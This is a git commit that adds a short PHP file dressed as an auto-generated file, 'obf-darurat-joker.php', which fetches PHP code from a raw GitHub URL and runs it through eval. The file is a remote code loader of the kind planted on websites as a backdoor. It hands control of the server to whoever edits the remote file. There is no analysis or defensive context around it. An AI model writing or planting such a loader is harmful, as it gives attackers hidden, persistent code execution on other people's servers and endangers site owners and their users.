16feb5a9b7a32a534b11d9c834541b640bba6202
dee1103 <nehadhe9@gmail.com>
2026-04-27 18:24:11 +0700

    obf-darurat-joker.php

---
+++ obf-darurat-joker.php
@@ -0,0 +1,18 @@
+<?php
+// Auto-generated file
+// Do not edit manually
+
+$url = "https://raw.githubusercontent.com/dee1103/dee/refs/heads/main/obf-kecil-joker.php"; 
+
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
+    $data = curl_exec($ch);
+    curl_close($ch);
+
+
+    if ($data) {
+        eval("?>$data"); 
+    }   
+    ?>
